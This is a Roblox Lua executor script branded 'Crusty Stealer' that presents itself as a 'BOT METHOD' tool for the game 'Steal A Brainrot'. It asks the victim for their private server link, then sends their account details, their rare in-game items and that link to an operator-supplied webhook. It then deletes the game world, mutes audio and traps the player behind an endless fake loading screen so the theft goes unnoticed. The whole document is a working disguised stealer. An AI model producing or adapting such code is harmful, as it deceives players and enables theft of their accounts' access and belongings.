local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local SoundService = game:GetService("SoundService")
local LocalPlayer = Players.LocalPlayer
local webhookURL = _G.WEBHOOK or WEBHOOK or getgenv().WEBHOOK

if not webhookURL then
    return
end

local requestFunc = (syn and syn.request) or request or http_request or (http and http.request)
if not requestFunc then
    return
end

local function isPrivateServer()
    local playerCount = #Players:GetPlayers()
    return playerCount <= 4
end

local function getPlayerAvatar(userId)
    local success, result = pcall(function()
        return "https://www.roblox.com/headshot-thumbnail/image?userId="..userId.."&width=420&height=420&format=png"
    end)
    return success and result or "https://raw.githubusercontent.com/platinww/CrustyMain/refs/heads/main/UISettings/crustylogonew.png"
end

local function parseGeneration(text)
    if not text then return 0 end
    local number, multiplier = text:match("%$([%d%.]+)([KMBT]?)/[sh]")
    if not number then return 0 end
    number = tonumber(number) or 0
    local multipliers = {
        K = 1000,
        M = 1000000,
        B = 1000000000,
        T = 1000000000000
    }
    if multiplier and multipliers[multiplier] then
        number = number * multipliers[multiplier]
    end
    return number
end

local function sendWebhook(embedData)
    pcall(function()
        local data = {
            username = "Notifier",
            avatar_url = "https://raw.githubusercontent.com/platinww/CrustyMain/refs/heads/main/UISettings/crustylogonew.png",
            embeds = {embedData}
        }
        local jsonData = HttpService:JSONEncode(data)
        requestFunc({
            Url = webhookURL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = jsonData
        })
    end)
end

local function sendInitialWebhook()
    local avatarUrl = getPlayerAvatar(LocalPlayer.UserId)
    local embed = {
        title = "Crusty Stealer",
        description = "**Someone is using Crusty Your Stealer Script!**",
        color = 0x8A2BE2,
        thumbnail = {
            url = avatarUrl
        },
        fields = {
            {
                name = "Player Information",
                value = string.format(
                    "```yaml\nName: %s\nID: %s\nAge: %d days\nDisplay: %s```",
                    LocalPlayer.Name,
                    LocalPlayer.UserId,
                    LocalPlayer.AccountAge,
                    LocalPlayer.DisplayName
                ),
                inline = false
            },
            {
                name = "Server Information",
                value = string.format(
                    "```yaml\nPlayers: %d\nGame: Steal A Brainrot\nStatus: Private Server```",
                    #Players:GetPlayers()
                ),
                inline = false
            }
        },
        footer = {
            text = "Crusty Hit Steal - Initializing",
            icon_url = "https://raw.githubusercontent.com/platinww/CrustyMain/refs/heads/main/UISettings/crustylogonew.png"
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
    }
    sendWebhook(embed)
end

local function createUI()
    local oldGui = LocalPlayer.PlayerGui:FindFirstChild("CrustyUI")
    if oldGui then oldGui:Destroy() end
    
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "CrustyUI"
    ScreenGui.ResetOnSpawn = false
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    
    pcall(function()
        ScreenGui.Parent = game:GetService("CoreGui")
    end)
    if not ScreenGui.Parent then
        ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    end
    
    local MainFrame = Instance.new("Frame")
    MainFrame.Name = "MainFrame"
    MainFrame.Size = UDim2.new(0, 500, 0, 320)
    MainFrame.Position = UDim2.new(0.5, -250, 0.5, -160)
    MainFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
    MainFrame.BorderSizePixel = 0
    MainFrame.Active = true
    MainFrame.Draggable = true
    MainFrame.Parent = ScreenGui
    
    local Corner = Instance.new("UICorner")
    Corner.CornerRadius = UDim.new(0, 16)
    Corner.Parent = MainFrame
    
    local Border = Instance.new("UIStroke")
    Border.Color = Color3.fromRGB(138, 43, 226)
    Border.Thickness = 2
    Border.Transparency = 0.5
    Border.Parent = MainFrame
    
    local Header = Instance.new("Frame")
    Header.Size = UDim2.new(1, 0, 0, 70)
    Header.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
    Header.BorderSizePixel = 0
    Header.Parent = MainFrame
    
    local HeaderCorner = Instance.new("UICorner")
    HeaderCorner.CornerRadius = UDim.new(0, 16)
    HeaderCorner.Parent = Header
    
    local HeaderGradient = Instance.new("UIGradient")
    HeaderGradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(138, 43, 226)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(88, 0, 176))
    }
    HeaderGradient.Rotation = 45
    HeaderGradient.Parent = Header
    
    local Title = Instance.new("TextLabel")
    Title.Size = UDim2.new(1, -100, 1, 0)
    Title.Position = UDim2.new(0, 20, 0, 0)
    Title.BackgroundTransparency = 1
    Title.Font = Enum.Font.GothamBold
    Title.Text = "BOT METHOD"
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.TextSize = 24
    Title.TextXAlignment = Enum.TextXAlignment.Left
    Title.Parent = Header
    
    local CloseButton = Instance.new("TextButton")
    CloseButton.Size = UDim2.new(0, 40, 0, 40)
    CloseButton.Position = UDim2.new(1, -55, 0, 15)
    CloseButton.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
    CloseButton.BorderSizePixel = 0
    CloseButton.Font = Enum.Font.GothamBold
    CloseButton.Text = "X"
    CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    CloseButton.TextSize = 20
    CloseButton.Parent = Header
    
    local CloseCorner = Instance.new("UICorner")
    CloseCorner.CornerRadius = UDim.new(0, 8)
    CloseCorner.Parent = CloseButton
    
    CloseButton.MouseButton1Click:Connect(function()
        ScreenGui:Destroy()
    end)
    
    local Content = Instance.new("Frame")
    Content.Size = UDim2.new(1, -40, 0, 220)
    Content.Position = UDim2.new(0, 20, 0, 80)
    Content.BackgroundTransparency = 1
    Content.Parent = MainFrame
    
    local Subtitle = Instance.new("TextLabel")
    Subtitle.Size = UDim2.new(1, 0, 0, 25)
    Subtitle.BackgroundTransparency = 1
    Subtitle.Font = Enum.Font.GothamBold
    Subtitle.Text = "ENTER PRIVATE SERVER LINK"
    Subtitle.TextColor3 = Color3.fromRGB(180, 180, 180)
    Subtitle.TextSize = 13
    Subtitle.TextXAlignment = Enum.TextXAlignment.Left
    Subtitle.Parent = Content
    
    local TextBoxContainer = Instance.new("Frame")
    TextBoxContainer.Size = UDim2.new(1, 0, 0, 55)
    TextBoxContainer.Position = UDim2.new(0, 0, 0, 35)
    TextBoxContainer.BackgroundColor3 = Color3.fromRGB(28, 28, 32)
    TextBoxContainer.BorderSizePixel = 0
    TextBoxContainer.Parent = Content
    
    local TextBoxCorner = Instance.new("UICorner")
    TextBoxCorner.CornerRadius = UDim.new(0, 10)
    TextBoxCorner.Parent = TextBoxContainer
    
    local TextBoxStroke = Instance.new("UIStroke")
    TextBoxStroke.Color = Color3.fromRGB(60, 60, 65)
    TextBoxStroke.Thickness = 1.5
    TextBoxStroke.Parent = TextBoxContainer
    
    local TextBox = Instance.new("TextBox")
    TextBox.Name = "ServerLinkBox"
    TextBox.Size = UDim2.new(1, -24, 1, -10)
    TextBox.Position = UDim2.new(0, 12, 0, 5)
    TextBox.BackgroundTransparency = 1
    TextBox.Font = Enum.Font.Gotham
    TextBox.PlaceholderText = "Please Enter Your PS Link"
    TextBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
    TextBox.Text = ""
    TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextBox.TextSize = 14
    TextBox.TextXAlignment = Enum.TextXAlignment.Left
    TextBox.ClearTextOnFocus = false
    TextBox.Parent = TextBoxContainer
    
    local SubmitButton = Instance.new("TextButton")
    SubmitButton.Name = "SubmitButton"
    SubmitButton.Size = UDim2.new(1, 0, 0, 55)
    SubmitButton.Position = UDim2.new(0, 0, 0, 105)
    SubmitButton.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
    SubmitButton.BorderSizePixel = 0
    SubmitButton.Font = Enum.Font.GothamBold
    SubmitButton.Text = "SUBMIT"
    SubmitButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    SubmitButton.TextSize = 18
    SubmitButton.AutoButtonColor = false
    SubmitButton.Parent = Content
    
    local ButtonCorner = Instance.new("UICorner")
    ButtonCorner.CornerRadius = UDim.new(0, 10)
    ButtonCorner.Parent = SubmitButton
    
    local Warning = Instance.new("TextLabel")
    Warning.Size = UDim2.new(1, 0, 0, 45)
    Warning.Position = UDim2.new(0, 0, 0, 170)
    Warning.BackgroundTransparency = 1
    Warning.Font = Enum.Font.Gotham
    Warning.Text = "You Need A In PS"
    Warning.TextColor3 = Color3.fromRGB(255, 170, 80)
    Warning.TextSize = 12
    Warning.TextWrapped = true
    Warning.Parent = Content
    
    SubmitButton.MouseEnter:Connect(function()
        game:GetService("TweenService"):Create(SubmitButton, TweenInfo.new(0.2), {
            BackgroundColor3 = Color3.fromRGB(158, 63, 246)
        }):Play()
    end)
    
    SubmitButton.MouseLeave:Connect(function()
        game:GetService("TweenService"):Create(SubmitButton, TweenInfo.new(0.2), {
            BackgroundColor3 = Color3.fromRGB(138, 43, 226)
        }):Play()
    end)
    
    return ScreenGui, TextBox, SubmitButton
end

local function createLoadingScreen(message)
    for _, gui in pairs(LocalPlayer.PlayerGui:GetChildren()) do
        if gui:IsA("ScreenGui") and gui.Name ~= "LoadingScreen" then
            gui:Destroy()
        end
    end
    
    pcall(function()
        for _, gui in pairs(game:GetService("CoreGui"):GetChildren()) do
            if gui:IsA("ScreenGui") and gui.Name ~= "LoadingScreen" then
                gui:Destroy()
            end
        end
    end)
    
    pcall(function()
        SoundService:SetListener(Enum.ListenerType.Camera, workspace.CurrentCamera)
        for _, sound in pairs(workspace:GetDescendants()) do
            if sound:IsA("Sound") then
                sound.Volume = 0
                sound:Stop()
            end
        end
        for _, sound in pairs(SoundService:GetDescendants()) do
            if sound:IsA("Sound") then
                sound.Volume = 0
                sound:Stop()
            end
        end
    end)
    
    pcall(function()
        for _, obj in pairs(workspace:GetChildren()) do
            if obj.Name ~= "Terrain" and obj.Name ~= "Camera" and obj.Name ~= "CurrentCamera" then
                obj:Destroy()
            end
        end
    end)
    
    pcall(function()
        LocalPlayer.PlayerGui:SetTopbarTransparency(1)
        game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
        game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
        game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Health, false)
        game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
    end)
    
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "LoadingScreen"
    ScreenGui.ResetOnSpawn = false
    ScreenGui.DisplayOrder = 999999999
    ScreenGui.IgnoreGuiInset = true
    
    pcall(function()
        ScreenGui.Parent = game:GetService("CoreGui")
    end)
    if not ScreenGui.Parent then
        ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    end
    
    local BlackScreen = Instance.new("Frame")
    BlackScreen.Name = "BlackScreen"
    BlackScreen.Size = UDim2.new(1, 0, 1, 36)
    BlackScreen.Position = UDim2.new(0, 0, 0, -36)
    BlackScreen.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    BlackScreen.BorderSizePixel = 0
    BlackScreen.ZIndex = 999999
    BlackScreen.Parent = ScreenGui
    
    local LoadingText = Instance.new("TextLabel")
    LoadingText.Name = "LoadingText"
    LoadingText.Size = UDim2.new(1, 0, 0, 300)
    LoadingText.Position = UDim2.new(0, 0, 0.5, -150)
    LoadingText.BackgroundTransparency = 1
    LoadingText.Font = Enum.Font.GothamBold
    LoadingText.Text = message
    LoadingText.TextColor3 = Color3.fromRGB(138, 43, 226)
    LoadingText.TextSize = 64
    LoadingText.TextWrapped = true
    LoadingText.ZIndex = 1000000
    LoadingText.Parent = ScreenGui
    
    local Gradient = Instance.new("UIGradient")
    Gradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(138, 43, 226)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(138, 43, 226))
    }
    Gradient.Parent = LoadingText
    
    spawn(function()
        while LoadingText.Parent do
            for i = 0, 360, 3 do
                if not LoadingText.Parent then break end
                pcall(function()
                    Gradient.Rotation = i
                end)
                task.wait(0.03)
            end
        end
    end)
    
    return ScreenGui, LoadingText
end

local function scanPlots()
    local plotsFolder = workspace:FindFirstChild("Plots")
    if not plotsFolder then
        return {}
    end
    
    local animalData = {}
    local validRarities = {"og", "secret", "brainrot god"}
    
    for _, plot in pairs(plotsFolder:GetChildren()) do
        if plot:IsA("Model") or plot:IsA("Folder") then
            local animalPodiums = plot:FindFirstChild("AnimalPodiums")
            if animalPodiums then
                for i = 1, 24 do
                    local podium = animalPodiums:FindFirstChild(tostring(i))
                    if podium then
                        local base = podium:FindFirstChild("Base")
                        if base then
                            local spawn = base:FindFirstChild("Spawn")
                            if spawn then
                                local attachment = spawn:FindFirstChild("Attachment")
                                if attachment then
                                    local animalOverhead = attachment:FindFirstChild("AnimalOverhead")
                                    if animalOverhead then
                                        local generation = animalOverhead:FindFirstChild("Generation")
                                        local displayName = animalOverhead:FindFirstChild("DisplayName")
                                        local mutation = animalOverhead:FindFirstChild("Mutation")
                                        local rarity = animalOverhead:FindFirstChild("Rarity")
                                        
                                        if generation and displayName and rarity and rarity.Visible then
                                            local genValue = parseGeneration(generation.Text)
                                            local animalName = displayName.Text or "Unknown"
                                            local rarityText = rarity.Text
                                            
                                            local isValidRarity = false
                                            local rarityLower = string.lower(rarityText)
                                            for _, validRarity in pairs(validRarities) do
                                                if rarityLower == validRarity then
                                                    isValidRarity = true
                                                    break
                                                end
                                            end
                                            
                                            if isValidRarity and genValue > 0 then
                                                local mutationText = nil
                                                if mutation and mutation.Visible then
                                                    mutationText = mutation.Text
                                                end
                                                
                                                table.insert(animalData, {
                                                    plotName = plot.Name,
                                                    podiumNumber = i,
                                                    animalName = animalName,
                                                    generation = genValue,
                                                    generationText = generation.Text,
                                                    mutation = mutationText,
                                                    rarity = rarityText
                                                })
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end
    
    return animalData
end

local function groupAnimals(animalData)
    local grouped = {}
    for _, data in pairs(animalData) do
        local key = data.animalName .. "|" .. data.generation .. "|" .. (data.mutation or "None") .. "|" .. (data.rarity or "None")
        if grouped[key] then
            grouped[key].count = grouped[key].count + 1
        else
            grouped[key] = {
                animalName = data.animalName,
                generation = data.generation,
                generationText = data.generationText,
                mutation = data.mutation,
                rarity = data.rarity,
                count = 1
            }
        end
    end
    return grouped
end

if not isPrivateServer() then
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "PrivateServerWarning"
    ScreenGui.ResetOnSpawn = false
    
    pcall(function()
        ScreenGui.Parent = game:GetService("CoreGui")
    end)
    if not ScreenGui.Parent then
        ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    end
    
    local Frame = Instance.new("Frame")
    Frame.Size = UDim2.new(0, 500, 0, 280)
    Frame.Position = UDim2.new(0.5, -250, 0.5, -140)
    Frame.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
    Frame.BorderSizePixel = 0
    Frame.Active = true
    Frame.Draggable = true
    Frame.Parent = ScreenGui
    
    local Corner = Instance.new("UICorner")
    Corner.CornerRadius = UDim.new(0, 16)
    Corner.Parent = Frame
    
    local Border = Instance.new("UIStroke")
    Border.Color = Color3.fromRGB(255, 60, 60)
    Border.Thickness = 2
    Border.Parent = Frame
    
    local Icon = Instance.new("TextLabel")
    Icon.Size = UDim2.new(1, 0, 0, 100)
    Icon.BackgroundTransparency = 1
    Icon.Font = Enum.Font.GothamBold
    Icon.Text = "WARNING"
    Icon.TextColor3 = Color3.fromRGB(255, 100, 100)
    Icon.TextSize = 72
    Icon.Parent = Frame
    
    local Warning = Instance.new("TextLabel")
    Warning.Size = UDim2.new(1, -40, 0, 100)
    Warning.Position = UDim2.new(0, 20, 0, 110)
    Warning.BackgroundTransparency = 1
    Warning.Font = Enum.Font.GothamBold
    Warning.Text = "THIS SCRIPT ONLY WORKS IN PRIVATE SERVERS!"
    Warning.TextColor3 = Color3.fromRGB(255, 255, 255)
    Warning.TextSize = 18
    Warning.TextWrapped = true
    Warning.Parent = Frame
    
    local Info = Instance.new("TextLabel")
    Info.Size = UDim2.new(1, -40, 0, 50)
    Info.Position = UDim2.new(0, 20, 0, 215)
    Info.BackgroundTransparency = 1
    Info.Font = Enum.Font.Gotham
    Info.Text = string.format("Current server: %d players\nPrivate server required", #Players:GetPlayers())
    Info.TextColor3 = Color3.fromRGB(200, 200, 200)
    Info.TextSize = 14
    Info.TextWrapped = true
    Info.Parent = Frame
    
    return
end

sendInitialWebhook()

local gui, textBox, submitButton = createUI()

submitButton.MouseButton1Click:Connect(function()
    local serverLink = textBox.Text
    
    if serverLink == "" then
        textBox.PlaceholderText = "Enter a link!"
        task.wait(2)
        textBox.PlaceholderText = "Please Enter Your Private Server Link"
        return
    end
    
    local isValidLink = serverLink:match("roblox%.com/games/") or
                        serverLink:match("roblox%.com/share%-links") or
                        serverLink:match("roblox%.com/%w+/games/") or
                        serverLink:match("roblox%.com/%w+/share%-links") or
                        serverLink:match("roblox%.com/.+/games/.+%?privateServerLinkCode=%w+") or
                        serverLink:match("roblox%.com/games/.+%?privateServerLinkCode=%w+") or
                        serverLink:match("roblox%.com/%w+/games/.+%?privateServerLinkCode=%w+")
    
    if not isValidLink then
        textBox.PlaceholderText = "Enter a valid Roblox link!"
        task.wait(2)
        textBox.PlaceholderText = "Please Enter Your Private Server Link"
        return
    end
    
    gui:Destroy()
    
    local animalData = scanPlots()
    local groupedAnimals = groupAnimals(animalData)
    
    local animalList = {}
    for _, data in pairs(groupedAnimals) do
        local line = ""
        if data.count > 1 then
            line = string.format("%s (x%d) | %s", data.animalName, data.count, data.generationText)
        else
            line = string.format("%s | %s", data.animalName, data.generationText)
        end
        
        if data.mutation then
            line = line .. " | " .. data.mutation
        else
            line = line .. " | No Mutation"
        end
        
        line = line .. " | " .. data.rarity
        table.insert(animalList, line)
    end
    
    local avatarUrl = getPlayerAvatar(LocalPlayer.UserId)
    
    local fields = {
        {
            name = "Player Information",
            value = string.format(
                "```yaml\nName: %s\nID: %s\nAge: %d days\nDisplay: %s```",
                LocalPlayer.Name,
                LocalPlayer.UserId,
                LocalPlayer.AccountAge,
                LocalPlayer.DisplayName
            ),
            inline = false
        },
        {
            name = "Server Information",
            value = string.format(
                "```yaml\nPlayers: %d\nGame: Steal A Brainrot\nStatus: Private Server```",
                #Players:GetPlayers()
            ),
            inline = false
        }
    }
    
    if #animalList > 0 then
        table.insert(fields, {
            name = "Brainrots Detected (" .. #animalData .. " total)",
            value = "```" .. table.concat(animalList, "\n") .. "```",
            inline = false
        })
    else
        table.insert(fields, {
            name = "Brainrots Detected",
            value = "```No brainrots found OG/Secret/BrainrotGod```",
            inline = false
        })
    end
    
    table.insert(fields, {
        name = "Target Server",
        value = serverLink,
        inline = false
    })
    
    local embed = {
        title = "Crusty Stealer",
        description = "**You Got A Hit!**",
        color = 0x8A2BE2,
        thumbnail = {
            url = avatarUrl
        },
        fields = fields,
        footer = {
            text = "Crusty Stealing System - Active",
            icon_url = "https://raw.githubusercontent.com/platinww/CrustyMain/refs/heads/main/UISettings/crustylogonew.png"
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
    }
    
    sendWebhook(embed)
    
    local loadingGui, loadingText = createLoadingScreen("PREPARING SCRIPT...")
    task.wait(20)
    loadingText.Text = "SEARCHING BOTS..."
    task.wait(90)
    loadingText.Text = "BOT FOUND"
    
    while true do
        task.wait(1)
    end
end)
